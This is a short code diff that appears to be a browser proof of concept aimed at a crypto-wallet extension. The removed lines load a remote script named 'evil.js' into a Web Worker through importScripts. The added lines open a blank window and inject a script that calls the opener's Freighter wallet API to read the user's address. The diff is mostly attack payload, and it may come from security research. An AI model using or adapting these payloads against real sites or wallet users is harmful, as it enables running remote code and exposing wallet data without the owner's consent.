@@ -1,7 +1,5 @@
+<a href="about:blank" target="_blank">open</a>
 <script>
-const code = `
-  importScripts('https://0x403for.github.io/evil.js');
-`;
-const blob = new Blob([code], {type:'application/javascript'});
-const worker = new Worker(URL.createObjectURL(blob));
+  let w = window.open('about:blank');
+  w.document.write(`<script>opener.freighterApi.getAddress().then(a=>alert(a))<\/script>`);
 </script>
